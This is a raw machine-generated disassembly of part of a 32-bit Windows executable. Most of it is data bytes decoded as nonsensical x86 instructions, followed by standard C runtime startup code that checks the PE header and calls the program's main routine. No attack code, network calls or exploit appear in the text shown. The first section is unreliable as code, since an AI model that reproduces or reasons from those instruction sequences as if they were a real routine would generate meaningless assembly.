  422359:	push   0xffffff91
  42235b:	xor    esi,DWORD PTR [edi+0x49fd9849]
  422361:	arpl   WORD PTR [eax+0x256bdbd1],dx
  422367:	pop    ebp
  422368:	int    0xcb
  42236a:	sub    esi,DWORD PTR [esi+0x74b8edfa]
  422370:	imul   DWORD PTR [edx]
  422372:	cmova  edx,DWORD PTR [edx]
  422375:	scas   eax,DWORD PTR es:[edi]
  422376:	sub    DWORD PTR [eax+eiz*8],eax
  422379:	lds    esi,FWORD PTR [ecx-0x46944ecd]
  42237f:	(bad)  
  422381:	mov    WORD PTR [esi+0x32],?
  422384:	clc    
  422385:	cli    
  422386:	dec    ecx
  422387:	in     eax,dx
  422388:	imul   ebp,DWORD PTR [ebx-0x103c33da],0xffffff84
  42238f:	inc    esi
  422390:	cmp    eax,0x946a8ce9
  422395:	sbb    DWORD PTR [ebp-0x31691b07],esi
  42239b:	ficom  WORD PTR [ebp+0x3e]
  42239e:	icebp  
  42239f:	cmp    al,0x3d
  4223a1:	xchg   esi,eax
  4223a2:	mov    dh,0x35
  4223a4:	or     al,0xe6
  4223a6:	jo     0x422427
  4223a8:	inc    edx
  4223a9:	int3   
  4223aa:	mov    al,BYTE PTR [ecx+0x75739103]
  4223b0:	pop    edi
  4223b1:	cmp    esi,eax
  4223b3:	mov    DWORD PTR ds:0x36966996,edi
  4223b9:	sahf   
  4223ba:	in     eax,dx
  4223bb:	jns    0x422381
  4223bd:	and    al,0x5e
  4223bf:	mov    cl,0xaf
  4223c1:	mov    DWORD PTR [ebx+eax*8+0x70],edx
  4223c5:	stc    
  4223c6:	stos   DWORD PTR es:[edi],eax
  4223c7:	mov    eax,ds:0x1f3340a1
  4223cc:	lods   eax,DWORD PTR ds:[esi]
  4223cd:	xchg   DWORD PTR [ebx-0x118b5838],ecx
  4223d3:	sub    DWORD PTR [ebp-0x57],ecx
  4223d6:	fisttp QWORD PTR [ecx+0x35]
  4223d9:	aas    
  4223da:	iret   
  4223db:	push   edx
  4223dc:	inc    ecx
  4223dd:	in     eax,0x40
  4223df:	icebp  
  4223e0:	sbb    DWORD PTR [ebx],0xf74723a1
  4223e6:	and    eax,0xf1ccdf59
  4223eb:	outs   dx,BYTE PTR ds:[esi]
  4223ec:	and    eax,0xe46c3e0e
  4223f1:	pusha  
  4223f2:	(bad)  [eax+0x76568d95]
  4223f8:	lods   eax,DWORD PTR ds:[esi]
  4223f9:	inc    ebx
  4223fa:	xchg   ebx,eax
  4223fb:	out    0x43,eax
  4223fd:	cmp    DWORD PTR [ebp-0x3c0b982c],ecx
  422403:	lahf   
  422404:	or     al,0x65
  422406:	ret    0x7ee3
  422409:	pop    edx
  42240a:	mov    edx,0x85e1807b
  42240f:	xchg   esp,eax
  422410:	xchg   ebx,eax
  422411:	loop   0x4223fe
  422413:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422414:	mov    cl,0x28
  422416:	ds ss jmp 0xa305d60a
  42241d:	cs (bad) 
  42241f:	gs xchg ecx,eax
  422421:	enter  0x565b,0xd2
  422425:	jmp    FWORD PTR [ebx+0x7b]
  422428:	in     eax,dx
  422429:	push   esi
  42242a:	das    
  42242b:	xor    al,0xdf
  42242d:	xor    eax,0xdc1e1355
  422432:	and    dl,BYTE PTR [ebp-0x17]
  422435:	pop    ebx
  422437:	cmp    BYTE PTR [edi],dh
  422439:	cmp    bl,dh
  42243b:	loop   0x422439
  42243d:	rol    DWORD PTR [ebx-0x36],cl
  422440:	and    eax,0x6a37faa3
  422445:	cmp    BYTE PTR [edx-0x7be2811d],bh
  42244b:	sti    
  42244c:	inc    ebx
  42244d:	jp     0x422455
  42244f:	pushf  
  422450:	push   esp
  422451:	mov    ah,0x18
  422453:	or     al,0x4
  422455:	popf   
  422456:	adc    BYTE PTR [eax],ah
  422458:	sub    al,0xe6
  42245a:	fldenv ds:0x33507d6f
  422460:	sbb    DWORD PTR [edx+0x1523dbda],esp
  422466:	gs jbe 0x4224e4
  422469:	xor    ebx,0x14e05e96
  42246f:	and    dl,BYTE PTR [edx-0x56]
  422472:	aad    0x13
  422474:	inc    ebx
  422475:	inc    edi
  422476:	shr    bh,1
  422478:	jl     0x422440
  42247a:	dec    edx
  42247b:	js     0x4224a9
  42247d:	inc    esp
  42247e:	mul    DWORD PTR [eax-0x343fe75]
  422484:	mov    WORD PTR [esi-0x1e],?
  422487:	adc    DWORD PTR gs:[ebp-0x306fb50],0x8a90a3de
  422492:	(bad)  
  422493:	fadd   QWORD PTR ds:0xc9660fac
  422499:	fwait
  42249a:	sub    BYTE PTR [ebp-0x18],ah
  42249d:	add    ch,BYTE PTR [edi]
  42249f:	xor    DWORD PTR [ecx-0x1e5d0da9],esi
  4224a5:	cld    
  4224a6:	jle    0x4224ae
  4224a8:	or     eax,0x705d7cbe
  4224ad:	sub    eax,0x4c59c0b7
  4224b2:	rol    BYTE PTR [ebp-0x6f],0xec
  4224b6:	cdq    
  4224b7:	(bad)  
  4224b8:	add    al,0x6
  4224ba:	ins    BYTE PTR es:[edi],dx
  4224bb:	neg    DWORD PTR [edi+0x1f]
  4224be:	jge    0x422471
  4224c0:	xchg   edi,eax
  4224c1:	pop    eax
  4224c2:	pop    ds
  4224c3:	dec    edx
  4224c4:	ror    DWORD PTR [ecx+0x49],0xa4
  4224c8:	jo     0x42246c
  4224ca:	jmp    0x6abc2250
  4224cf:	mov    ah,0xc
  4224d1:	jl     0x4224e2
  4224d3:	cmc    
  4224d4:	clc    
  4224d5:	jmp    0x48b7cd2f
  4224da:	mov    ebx,0x3c31263
  4224df:	jl     0x422519
  4224e1:	pushf  
  4224e2:	lods   eax,DWORD PTR ds:[esi]
  4224e3:	std    
  4224e4:	lock add al,0xee
  4224e7:	inc    ebx
  4224e8:	push   ecx
  4224e9:	xor    bl,BYTE PTR [ecx-0x4e]
  4224ec:	fs mov cl,0xd1
  4224ef:	popa   
  4224f0:	push   eax
  4224f1:	xor    DWORD PTR [esi],0x6e
  4224f4:	mov    eax,DWORD PTR [esi+ebp*2]
  4224f7:	fnstenv [edx+ebp*4-0x64]
  4224fb:	inc    ebp
  4224fc:	pop    ebp
  4224fd:	mov    dl,0x53
  4224ff:	sbb    cl,BYTE PTR [edi-0x8afc971]
  422505:	sub    DWORD PTR [ebp+0x4e5d2a5a],0x4533da5d
  42250f:	and    esp,0xde01c6e5
  422515:	mov    bl,0xae
  422517:	xlat   BYTE PTR ds:[ebx]
  422518:	adc    eax,0x8abeb02a
  42251d:	in     al,0x34
  42251f:	pop    esp
  422520:	push   esp
  422521:	or     eax,0xd68ba15d
  422526:	out    0x69,eax
  422528:	jge    0x422510
  42252a:	sbb    BYTE PTR [ebx-0x4098ac4b],bl
  422530:	jp     0x4224da
  422532:	push   ds
  422533:	push   0xb6b1891e
  422538:	pusha  
  422539:	and    al,0xe0
  42253b:	loope  0x422566
  42253d:	pop    ebx
  42253e:	inc    esp
  42253f:	loopne 0x4225b0
  422541:	and    dh,BYTE PTR [ecx]
  422543:	or     BYTE PTR [eax],0xba
  422546:	and    edx,DWORD PTR [edx]
  422548:	pop    edx
  422549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42254a:	mov    al,ds:0xc45dd9ae
  42254f:	shl    BYTE PTR [ebx-0x1e],1
  422552:	push   edi
  422553:	(bad)  
  422554:	leave  
  422555:	dec    esi
  422556:	outs   dx,BYTE PTR ds:[esi]
  422557:	inc    edi
  422558:	daa    
  422559:	retf   0x9f42
  42255c:	iret   
  42255d:	sbb    bl,BYTE PTR [esi+0x31]
  422560:	sahf   
  422561:	and    al,0x8f
  422563:	stc    
  422564:	xor    bh,BYTE PTR [edi+0x49]
  422567:	mov    bh,0x64
  422569:	and    ch,bl
  42256b:	mov    ds,WORD PTR [edx-0x6087369e]
  422571:	mov    esi,0x312b6d9d
  422576:	ror    DWORD PTR [eax+0x79],1
  422579:	mov    bh,0x8a
  42257b:	outs   dx,DWORD PTR ds:[esi]
  42257c:	(bad)  
  42257d:	pop    ss
  42257e:	and    edx,edx
  422580:	xchg   esp,eax
  422581:	sar    BYTE PTR [ecx-0x62e0915a],0x61
  422588:	lods   eax,DWORD PTR ds:[esi]
  422589:	mov    esp,0xddabdddd
  42258e:	(bad)  
  42258f:	sub    BYTE PTR ds:0x67660825,cl
  422595:	inc    esp
  422596:	jp     0x42253b
  422598:	sbb    al,0xad
  42259a:	and    BYTE PTR [edx],0xf6
  42259d:	cmp    al,0x7
  42259f:	ja     0x4225a9
  4225a1:	or     dh,BYTE PTR [eax+eax*1+0x3e]
  4225a5:	lods   eax,DWORD PTR ds:[esi]
  4225a6:	aaa    
  4225a7:	pop    ecx
  4225a8:	dec    edx
  4225a9:	mov    esi,0xbbfd0029
  4225ae:	push   eax
  4225af:	pop    eax
  4225b0:	mov    al,0x70
  4225b2:	sub    al,0x1d
  4225b4:	cmp    al,0xd4
  4225b6:	shr    edi,1
  4225b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225b9:	or     eax,0xa5e81596
  4225be:	sbb    BYTE PTR [ebp-0x1cfaeb17],bh
  4225c4:	mov    eax,ds:0xf6fc7954
  4225c9:	sbb    dl,BYTE PTR [ecx-0x466859f0]
  4225cf:	sub    dl,BYTE PTR [ebx+0x138793be]
  4225d5:	scas   eax,DWORD PTR es:[edi]
  4225d6:	mov    eax,0xbd53d2ef
  4225db:	test   eax,0xe3ce8742
  4225e0:	(bad)  
  4225e1:	hlt    
  4225e2:	push   esp
  4225e3:	sbb    dh,BYTE PTR [ebx-0x549d6cf3]
  4225e9:	jns    0x422607
  4225eb:	(bad)  
  4225ec:	mov    ecx,0x96108a38
  4225f1:	test   BYTE PTR [ecx-0x790c345e],dl
  4225f7:	and    edi,DWORD PTR [ecx-0x31]
  4225fa:	gs push ebx
  4225fc:	add    DWORD PTR [eax+0x6ea79ab8],edx
  422602:	bound  ecx,QWORD PTR [ebx]
  422604:	inc    esi
  422605:	push   DWORD PTR [eax-0x45]
  422608:	pop    ss
  422609:	stos   DWORD PTR es:[edi],eax
  42260a:	addr16 push 0x29fd7992
  422610:	scas   eax,DWORD PTR es:[edi]
  422611:	xchg   esi,eax
  422612:	repz int 0x3
  422615:	pop    ds
  422616:	xor    bl,BYTE PTR [edi-0x12]
  422619:	sub    DWORD PTR [edi],0xed4aebf3
  42261f:	xlat   BYTE PTR ds:[ebx]
  422620:	mov    esp,0xe7c134a5
  422625:	sbb    bl,bl
  422627:	dec    edx
  422628:	test   ebp,edx
  42262a:	mov    ah,0xcc
  42262c:	retf   0x196
  42262f:	cli    
  422630:	jmp    DWORD PTR [ecx+edx*4]
  422633:	mov    ebp,0x6da594a4
  422638:	mov    ds:0x31684962,al
  42263d:	stc    
  42263e:	xor    al,0xc7
  422640:	mov    ebp,DWORD PTR [ebx+0x7f]
  422643:	sbb    bh,BYTE PTR [edi-0x53792d72]
  422649:	push   ds
  42264a:	fwait
  42264b:	rcr    DWORD PTR [ebx],0xbe
  42264e:	sbb    al,0x53
  422650:	int    0xe3
  422652:	inc    ebx
  422653:	push   cs
  422654:	ficom  DWORD PTR [eax]
  422656:	dec    edx
  422657:	adc    eax,DWORD PTR [esi]
  422659:	sub    eax,0x241da852
  42265e:	ds inc edi
  422660:	js     0x4225f2
  422662:	and    esp,DWORD PTR [edi+esi*1-0x67db8c49]
  422669:	outs   dx,BYTE PTR ds:[esi]
  42266a:	stos   DWORD PTR es:[edi],eax
  42266b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266c:	ret    
  42266d:	shl    BYTE PTR [edi],cl
  42266f:	neg    DWORD PTR [edi-0x53]
  422672:	mov    al,ds:0x692f21b9
  422677:	mov    edi,0xee87c325
  42267c:	das    
  42267d:	jbe    0x4226bf
  42267f:	pop    ebx
  422680:	xchg   BYTE PTR [ecx+ecx*4+0xc],dh
  422684:	das    
  422685:	adc    BYTE PTR [eax-0x5c],bl
  422688:	sub    BYTE PTR [ebp-0x4962cc02],dl
  42268e:	out    0x9a,al
  422690:	(bad)  
  422691:	or     bh,bl
  422693:	sti    
  422694:	xchg   esp,eax
  422695:	mov    ds:0x92363eef,eax
  42269a:	push   ecx
  42269b:	push   ecx
  42269c:	mov    bl,0x3
  42269e:	arpl   ax,sp
  4226a0:	inc    ecx
  4226a1:	and    DWORD PTR [ebp+0x675dc658],esp
  4226a7:	daa    
  4226a8:	mov    esp,0xbee39d96
  4226ad:	(bad)  
  4226ae:	ret    0x368e
  4226b1:	xlat   BYTE PTR ds:[ebx]
  4226b2:	inc    ecx
  4226b3:	out    dx,al
  4226b4:	xchg   edi,eax
  4226b5:	daa    
  4226b6:	push   ebp
  4226b7:	bnd call 0x44b9fa73
  4226bd:	mov    cl,0x42
  4226bf:	fisttp QWORD PTR ds:0xa956a59
  4226c5:	jne    0x422699
  4226c7:	dec    esp
  4226c8:	retf   0xef7a
  4226cb:	and    eax,0xb6c1dae5
  4226d0:	js     0x422686
  4226d2:	aaa    
  4226d3:	retf   0x667d
  4226d6:	and    BYTE PTR [ecx+eiz*2-0x5a],cl
  4226da:	sub    al,0x13
  4226dc:	adc    al,0x64
  4226de:	leave  
  4226df:	adc    DWORD PTR [eax+0x17],0x2769d984
  4226e6:	shl    DWORD PTR [eax-0x2cb62d79],0x64
  4226ed:	mov    bh,0x47
  4226ef:	xchg   ebx,esp
  4226f1:	rcr    BYTE PTR [ecx+edx*4-0x61],1
  4226f5:	mov    edi,esi
  4226f7:	jns    0x4226c3
  4226f9:	pop    ss
  4226fa:	jp     0x422707
  4226fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226fd:	dec    edx
  4226fe:	jge    0x42272b
  422700:	mov    ds:0xb451f7cc,al
  422705:	xchg   ebp,eax
  422706:	addr16 pop ds
  422708:	loope  0x42274a
  42270a:	cmp    BYTE PTR [esi+ecx*2-0x6c],0x5c
  42270f:	mov    esi,0x4012f4b
  422714:	or     eax,0x3c28a69f
  422719:	dec    BYTE PTR [ecx+0x4e905a81]
  42271f:	mov    esp,0xf4504766
  422724:	and    bh,ch
  422726:	(bad)  
  422727:	jae    0x422723
  422729:	loop   0x4226eb
  42272b:	add    BYTE PTR [edi],dl
  42272d:	imul   esi,edx,0xffffffa5
  422730:	mov    ebx,0xc26e05ea
  422735:	enter  0xd39,0xb5
  422739:	mov    ch,0xc1
  42273b:	jns    0x4226fb
  42273d:	out    0xf0,al
  42273f:	adc    al,dl
  422741:	cld    
  422742:	xlat   BYTE PTR ds:[ebx]
  422743:	mov    esi,0x54b28029
  422748:	pop    es
  422749:	add    bl,al
  42274b:	sub    BYTE PTR [edx+0x18],0x2d
  42274f:	or     eax,0xc1c0a5d8
  422754:	shl    BYTE PTR [edx+0x7c],cl
  422757:	xor    DWORD PTR [esi-0x10],ecx
  42275a:	jl     0x422756
  42275c:	sbb    esp,edx
  42275e:	fdiv   DWORD PTR [ebx+0xe9becd3]
  422764:	cmp    ecx,DWORD PTR [ecx+0xe]
  422767:	push   DWORD PTR [esi-0x80]
  42276a:	cmp    al,0x6c
  42276c:	add    bh,BYTE PTR [ecx+edx*4]
  42276f:	inc    eax
  422770:	loope  0x422750
  422772:	mov    edx,0x84726b00
  422777:	jne    0x422771
  422779:	adc    eax,0xddbf48b0
  42277e:	mov    eax,0x9082c8e3
  422783:	add    BYTE PTR [esi+esi*4-0x49],dh
  422787:	sbb    DWORD PTR [edx],ebp
  422789:	call   0x204a:0x2ea06112
  422790:	and    BYTE PTR [ebx+0x45],0xf0
  422794:	push   eax
  422795:	inc    esi
  422796:	push   esi
  422797:	mov    ah,0xa
  422799:	push   ebp
  42279a:	nop
  42279b:	fs ds pop ebp
  42279e:	sbb    eax,0xccd8ced8
  4227a3:	or     eax,0x51a0e55a
  4227a8:	cdq    
  4227a9:	sub    eax,0xf078b664
  4227ae:	adc    ebp,ecx
  4227b0:	leave  
  4227b1:	or     DWORD PTR [edx+0x77],esp
  4227b4:	lea    eax,[eax]
  4227b6:	test   al,0x74
  4227b8:	ins    DWORD PTR es:[edi],dx
  4227b9:	cmp    BYTE PTR [esi+0x51],cl
  4227bc:	jl     0x422774
  4227be:	mov    esi,0x1c1f45e1
  4227c3:	loop   0x4227d2
  4227c5:	clc    
  4227c6:	mov    cs,WORD PTR [esi+0x1c]
  4227c9:	push   ss
  4227ca:	lods   eax,DWORD PTR ds:[esi]
  4227cb:	mov    bl,0x2d
  4227cd:	aad    0xf2
  4227cf:	add    dl,ah
  4227d1:	data16 ds jb 0x4227c9
  4227d5:	aaa    
  4227d6:	or     al,0xb
  4227d8:	(bad)  
  4227d9:	mov    WORD PTR [bx+si+0x939],ds
  4227de:	or     ecx,edx
  4227e0:	(bad)
  4227e5:	je     0x422788
  4227e7:	imul   ebp,DWORD PTR [edx-0x7b2388a0],0x3c16dae7
  4227f1:	adc    ch,BYTE PTR [eax]
  4227f3:	mov    bh,0xc
  4227f5:	(bad)  
  4227f7:	and    BYTE PTR ds:0x25d187bd,dh
  4227fd:	cmp    DWORD PTR [esi],ebx
  4227ff:	sbb    bh,BYTE PTR [eax]
  422801:	outs   dx,BYTE PTR ds:[esi]
  422802:	daa    
  422803:	es aad 0xf2
  422806:	fsubr  DWORD PTR [eax+0x7b5a754a]
  42280c:	mov    cl,0xdd
  42280e:	sub    DWORD PTR [eax+eiz*8+0x5931bf03],edx
  422815:	hlt    
  422816:	dec    esi
  422817:	test   DWORD PTR [esi],ecx
  422819:	sti    
  42281a:	iret   
  42281b:	bound  ebx,QWORD PTR [esi-0x10f3d68f]
  422821:	inc    ecx
  422822:	(bad)  
  422823:	fwait
  422824:	(bad)  
  422825:	jo     0x4227d9
  422827:	popf   
  422828:	mov    ah,0x3
  42282a:	rcl    DWORD PTR [eax+0x6709800],cl
  422830:	shl    DWORD PTR [edi+0x57da09b2],0xee
  422837:	daa    
  422838:	sub    DWORD PTR [esp+edi*4+0x223e8201],0xfffffff5
  422840:	fiadd  WORD PTR [ebx-0x3e]
  422843:	inc    edi
  422844:	pusha  
  422845:	test   eax,0xc6f5bdfa
  42284a:	inc    edi
  42284b:	leave  
  42284c:	pop    es
  42284d:	jecxz  0x4228a1
  42284f:	mov    dh,0x7
  422851:	stos   BYTE PTR es:[edi],al
  422852:	outs   dx,DWORD PTR ds:[esi]
  422853:	(bad)  
  422854:	sub    eax,0x19cb4edf
  422859:	out    dx,al
  42285a:	xor    DWORD PTR ds:0xbc585654,esp
  422860:	std    
  422861:	es lock inc edi
  422864:	cli    
  422865:	xchg   ecx,eax
  422866:	push   es
  422867:	mov    ah,0xf1
  422869:	loop   0x4228c8
  42286b:	addr16 jl 0x422864
  42286e:	sub    dl,bl
  422870:	inc    eax
  422871:	cmp    ebp,ebx
  422873:	shl    BYTE PTR [ebx],0x95
  422876:	(bad)
  422879:	pop    ss
  42287a:	pop    ebp
  42287b:	scas   al,BYTE PTR es:[edi]
  42287c:	in     eax,0x38
  42287e:	adc    BYTE PTR [ebp-0x12],dl
  422881:	shr    DWORD PTR [ecx+0x67],1
  422884:	mov    bh,0x7d
  422886:	cwde   
  422887:	lods   eax,DWORD PTR ds:[esi]
  422888:	dec    ebp
  422889:	(bad)  
  42288a:	fwait
  42288b:	repz loop 0x4228ca
  42288e:	jo     0x4228ca
  422890:	cmc    
  422891:	push   edi
  422892:	and    ebx,edi
  422894:	pop    esi
  422895:	(bad)  
  422896:	jno    0x4228e1
  422898:	push   esp
  422899:	outs   dx,BYTE PTR ds:[esi]
  42289a:	fiadd  DWORD PTR [ecx-0x30]
  42289d:	mov    bl,0x81
  42289f:	jo     0x422832
  4228a1:	mov    cl,0x69
  4228a3:	in     al,dx
  4228a4:	mov    ecx,0xf6ed8a6c
  4228a9:	inc    ebx
  4228aa:	data16 jnp 0x4228fc
  4228ad:	mov    ecx,0xb680173c
  4228b2:	or     BYTE PTR [ebx+0x7ec3fb37],bh
  4228b8:	ins    DWORD PTR es:[edi],dx
  4228b9:	sbb    ecx,DWORD PTR [eax-0x6130d86f]
  4228bf:	mov    esp,0xc349d5ed
  4228c4:	pop    ebp
  4228c5:	push   0xffffffb3
  4228c7:	inc    ecx
  4228c8:	jg     0x4228e6
  4228ca:	sar    BYTE PTR [edi],cl
  4228cc:	xor    BYTE PTR [edx+ecx*2-0x5d],ch
  4228d0:	sub    al,0xa1
  4228d2:	repz daa 
  4228d4:	dec    esi
  4228d5:	adc    DWORD PTR [edi],0xe9f4e1bf
  4228db:	sahf   
  4228dc:	ror    DWORD PTR [esi-0x22],0x69
  4228e0:	mov    eax,ds:0xc0f08067
  4228e5:	and    DWORD PTR [edi+eiz*1-0x2a63e1ae],esi
  4228ec:	aad    0x2f
  4228ee:	mov    dl,0xe2
  4228f0:	in     eax,dx
  4228f1:	leave  
  4228f2:	into   
  4228f3:	sbb    eax,0xf00fde2f
  4228f8:	(bad)  
  4228f9:	mov    dh,BYTE PTR ds:0x6b76af36
  4228ff:	call   0xfcd01c0f
  422904:	mov    eax,ds:0x61bf3ffb
  422909:	mov    fs,WORD PTR ds:0x7642ceb
  42290f:	jge    0x42293c
  422911:	js     0x422977
  422913:	out    dx,eax
  422914:	sub    al,0x24
  422916:	mul    BYTE PTR [ebp+0x4475a965]
  42291c:	cmc    
  42291d:	loop   0x422923
  42291f:	(bad)  
  422920:	cld    
  422921:	outs   dx,DWORD PTR ds:[esi]
  422922:	inc    ebp
  422923:	mov    eax,ds:0xa1d71932
  422928:	test   BYTE PTR [ecx+ecx*4],dl
  42292b:	or     dh,dl
  42292d:	in     al,dx
  42292e:	mov    bh,0x13
  422930:	(bad)  
  422931:	xlat   BYTE PTR ds:[ebx]
  422932:	pop    edx
  422933:	jae    0x42292f
  422935:	xchg   edi,eax
  422936:	pop    DWORD PTR [edi+eax*1+0x792cdd1]
  42293d:	shr    bh,cl
  42293f:	jg     0x422999
  422941:	jecxz  0x42298a
  422943:	pop    ss
  422944:	test   BYTE PTR [esi+eax*4-0x6b9ff857],bl
  42294b:	dec    esi
  42294c:	ss pushf 
  42294e:	mov    dl,0x5c
  422950:	inc    ecx
  422951:	inc    edi
  422952:	sbb    BYTE PTR [ecx],bh
  422954:	jle    0x422958
  422956:	add    BYTE PTR [edi],bl
  422958:	fucomip st,st(5)
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
